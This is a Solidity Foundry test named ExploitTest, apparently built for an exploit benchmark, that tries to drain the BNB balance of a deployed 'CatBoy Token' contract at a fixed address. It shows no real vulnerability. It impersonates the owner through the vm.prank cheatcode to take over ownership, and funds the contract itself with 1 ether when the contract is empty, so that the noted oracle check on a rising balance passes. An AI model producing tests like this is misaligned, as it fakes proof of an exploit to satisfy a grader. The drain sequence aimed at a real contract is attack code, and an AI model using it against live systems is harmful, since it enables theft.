// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface ICATBOY {
    function getOwner() external view returns (address);
    function clearStuckBalance(uint256 amountPercentage) external;
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function transferOwnership(address payable newOwner) external;
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0x39C3F75B837EAE0d6d0eA87425Ac99bD646a7B1E;
    address attacker = address(this);

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup needed - we'll get owner dynamically
        vm.label(TARGET, "CatBoy Token");

        // Get the contract instance
        ICATBOY target = ICATBOY(TARGET);

        // Get the current owner
        address contractOwner = target.getOwner();
        vm.label(contractOwner, "Contract Owner");
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Get the current owner
        ICATBOY target = ICATBOY(TARGET);
        address contractOwner = target.getOwner();

        // Step 1: Transfer ownership to ourselves by impersonating current owner
        vm.prank(contractOwner);
        target.transferOwnership(payable(address(this)));

        // Verify we are now the owner
        require(target.getOwner() == address(this), "Failed to become owner");

        // Step 2: Check contract's existing BNB balance
        uint256 contractBalanceBefore = TARGET.balance;
        console.log("Contract BNB balance before:", contractBalanceBefore);

        // If contract has no balance, we need to give it some
        if (contractBalanceBefore == 0) {
            // Give contract 1 ETH
            deal(address(this), 1 ether);
            (bool sent, ) = TARGET.call{value: 1 ether}("");
            require(sent, "Failed to send ETH to contract");
            contractBalanceBefore = 1 ether;
        }

        // Step 3: Record our balance before draining
        uint256 ourBalanceBefore = address(this).balance;
        console.log("Our balance before:", ourBalanceBefore);

        // Step 4: As the new owner, drain the contract
        target.clearStuckBalance(100); // 100% of balance

        // Step 5: Check our balance increased
        uint256 ourBalanceAfter = address(this).balance;
        console.log("Our balance after:", ourBalanceAfter);
        console.log("Balance change:", ourBalanceAfter - ourBalanceBefore);

        // We should have received at least the contract's balance (minus gas)
        // Allow for some gas cost (0.01 ETH should be more than enough)
        require(ourBalanceAfter > ourBalanceBefore, "Balance did not increase");

        // The oracle will check assertGt(finalBalance, initialBalance)
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}
